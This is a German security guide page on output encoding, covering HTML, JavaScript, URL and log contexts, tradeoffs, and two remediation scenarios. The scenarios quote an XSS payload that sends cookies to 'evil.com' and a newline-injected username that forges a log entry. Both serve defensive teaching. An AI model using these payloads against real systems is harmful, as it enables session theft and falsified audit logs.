---
title: Output-Encoding
description: Maskierung von Ausgaben zur Verhinderung von Injection-Angriffen.
category:
- Security
- Code
problems:
- cross-site-scripting-vulnerabilities
- sql-injection-vulnerabilities
- log-injection-vulnerabilities
- error-message-information-disclosure
- inadequate-error-handling
- insecure-data-transmission
layout: solution
lang: de
en_slug: output-encoding
related_solutions:
- slug: canonicalization
  similarity: 0.75
- slug: input-validation
  similarity: 0.75
- slug: encryption
  similarity: 0.65
- slug: logging-and-monitoring
  similarity: 0.65
- slug: authentication
  similarity: 0.65
- slug: data-flow-control
  similarity: 0.65
---

## Description

Output-Encoding transformiert nicht vertrauenswürdige Daten in eine Darstellung, die für den spezifischen Kontext sicher ist, in den sie eingefügt wird — HTML-Body, HTML-Attribut, JavaScript, URL, SQL oder ein Logeintrag —, sodass die Daten immer als inerter Inhalt behandelt werden statt als ausführbare Anweisungen. Legacy-Systeme verketten häufig nutzergelieferte Strings direkt in diese Kontexte ohne jegliche solche Transformation, was genau der Weg ist, wie Injection-Angriffe wie Cross-Site Scripting und Log Forging gelingen. Da Encoding-Regeln je nach Kontext unterschiedlich sind, bietet die Anwendung der falschen Regel (z. B. HTML-Encoding von Daten, die für einen JavaScript-Kontext bestimmt sind) keinen echten Schutz, was kontextbewusste Templating-Engines weit verlässlicher macht als manuelles, ad hoc über Legacy-Code verstreutes Encoding. Output-Encoding versteht sich am besten als zweite, unabhängige Verteidigungsebene, die Input-Validierung ergänzt: Selbst Eingaben, die an der Validierung vorbeigleiten, können nicht ausgeführt werden, wenn sie an jedem Punkt, an dem sie gerendert werden, korrekt encodiert sind.

## How to Apply ◆

> Legacy-Systeme fügen häufig Daten in Ausgabekontexte (HTML, SQL, JavaScript, URLs, Logs) ein, ohne sie für den Zielkontext zu encodieren, was Injection-Angriffe ermöglicht. Output-Encoding transformiert Daten in eine sichere Darstellung für jeden spezifischen Ausgabekontext.

- Identifizieren Sie alle Ausgabekontexte im Legacy-System, in die nicht vertrauenswürdige Daten eingefügt werden: HTML-Body, HTML-Attribute, JavaScript, CSS, URLs, SQL-Abfragen, XML, JSON, Logeinträge und Shell-Befehle. Jeder Kontext erfordert unterschiedliche Encoding-Regeln.
- Wenden Sie HTML-Entity-Encoding an, wenn Sie nicht vertrauenswürdige Daten in HTML-Body-Inhalt einfügen. Zeichen wie `<`, `>`, `&`, `"` und `'` müssen durch ihre HTML-Entity-Äquivalente ersetzt werden, um XSS zu verhindern.
- Verwenden Sie JavaScript-spezifisches Encoding, wenn Sie Daten in JavaScript-Kontexte einfügen. HTML-Encoding reicht für JavaScript nicht aus — Daten müssen gemäß den Regeln für JavaScript-String-Literale escaped werden.
- Wenden Sie URL-Encoding an, wenn Sie nicht vertrauenswürdige Daten in URL-Parameter oder Pfadsegmente einfügen. Dies verhindert Parameter-Injection und stellt sicher, dass spezielle URL-Zeichen die URL-Struktur nicht verändern.
- Verwenden Sie kontextbewusste Templating-Engines, die Ausgaben automatisch für den korrekten Kontext encodieren. Viele moderne Templating-Engines bieten automatischen XSS-Schutz, aber Legacy-Systeme nutzen oft rohe String-Verkettung, die diese Schutzmechanismen umgeht.
- Encodieren Sie Log-Ausgaben, um Log-Injection-Angriffe zu verhindern. Zeilenumbrüche, ANSI-Escape-Sequenzen und Format-String-Spezifizierer in Logeinträgen sollten escaped oder entfernt werden, um zu verhindern, dass Angreifer Logeinträge fälschen oder Log-Viewer ausnutzen.
- Implementieren Sie eine Content Security Policy (CSP) als Defense-in-Depth-Maßnahme, die die Auswirkung jedes XSS begrenzt, das Output-Encoding umgeht. CSP beschränkt, welche Skripte ausgeführt werden können, und reduziert die Ausnutzbarkeit von Encoding-Fehlern.

## Tradeoffs ⇄

> Output-Encoding verhindert Injection-Angriffe, indem sichergestellt wird, dass Daten immer als Daten behandelt werden statt als ausführbarer Code, erfordert aber kontextbewusste Implementierung und konsistente Anwendung.

**Vorteile:**

- Verhindert Cross-Site Scripting, indem sichergestellt wird, dass nutzergelieferte, in Webseiten angezeigte Daten keine ausführbaren Skripte enthalten können.
- Ergänzt Input-Validierung durch eine zweite Verteidigungsebene — selbst wenn bösartige Eingaben die Validierung passieren, verhindert korrektes Encoding ihre Ausführung.
- Rückwirkend auf Legacy-Systeme anwendbar, ohne Geschäftslogik zu ändern — Encoding wird auf der Ausgabeebene angewendet, ohne Datenspeicherung oder -verarbeitung zu modifizieren.
- Kontextbewusstes Encoding ist verlässlicher als Input-Filterung, weil es die Grundursache (unsichere Ausgabe) adressiert, statt zu versuchen, alle möglichen Angriffseingaben zu antizipieren.

**Kosten und Risiken:**

- Unterschiedliche Ausgabekontexte erfordern unterschiedliches Encoding, und die Anwendung des falschen Encodings (z. B. HTML-Encoding in einem JavaScript-Kontext) bietet keinen Schutz.
- Legacy-Templating-Systeme unterstützen möglicherweise kein automatisches kontextbewusstes Encoding, was manuelles Encoding an jedem Ausgabepunkt erfordert.
- Doppel-Encoding (Encodierung bereits encodierter Daten) produziert verstümmelte Ausgaben, was ein häufiges Problem beim nachträglichen Einbau von Encoding in Legacy-Systeme mit inkonsistenten Encoding-Praktiken ist.
- Output-Encoding hilft nicht bei Rich-Content, bei dem HTML absichtlich gerendert wird (CMS-Systeme, E-Mail-Templates), was Sanitisierung statt Encoding erfordert.

## How It Could Be

> Die folgenden Szenarien veranschaulichen, wie Output-Encoding Injection-Angriffe in Legacy-Systemen verhindert.

Ein Legacy-Kundensupport-Portal zeigt Ticketdetails an, indem es kundengelieferten Text direkt mittels JSP-String-Verkettung in HTML einfügt: `<%= ticket.getDescription() %>`. Ein Kunde reicht ein Ticket mit der Beschreibung `<img src=x onerror=document.location='http://evil.com/steal?c='+document.cookie>` ein, und jedem Support-Mitarbeiter, der das Ticket ansieht, wird sein Session-Cookie gestohlen. Das Team ersetzt die rohe Ausgabe durch encodierte Ausgabe mittels JSTL: `<c:out value="${ticket.description}" />`, was die Ausgabe automatisch HTML-encodiert. Das bösartige Skript wird als sichtbarer Text gerendert statt ausgeführt. Das Team prüft alle 340 JSP-Seiten der Legacy-Anwendung und wandelt alle rohen Ausgabeausdrücke so um, dass sie kontextgerechtes Encoding verwenden, wodurch 47 zusätzliche, während der Prüfung entdeckte XSS-Schwachstellen beseitigt werden.

Eine Legacy-Anwendung schreibt nutzergelieferte Daten mittels `logger.info("User " + username + " logged in")` in Logdateien. Ein Angreifer registriert sich mit dem Benutzernamen `admin\nINFO: Password changed for root user` und injiziert einen gefälschten Logeintrag, der legitim erscheint, wenn das Operations-Team die Logs überprüft. Das Team implementiert Log-Encoding, das Zeilenumbrüche, Tabs und ANSI-Steuersequenzen in allen Logmeldungen escaped. Sie wechseln außerdem zu strukturiertem JSON-Logging, bei dem nutzergelieferte Werte immer in String-Feldern eingeschlossen sind, was es unmöglich macht, Log-Struktur zu injizieren. Nach der Behebung erscheint der Benutzername des Angreifers als einzelner Logeintrag mit escapten Zeichen statt als separate, gefälschte Logzeile.
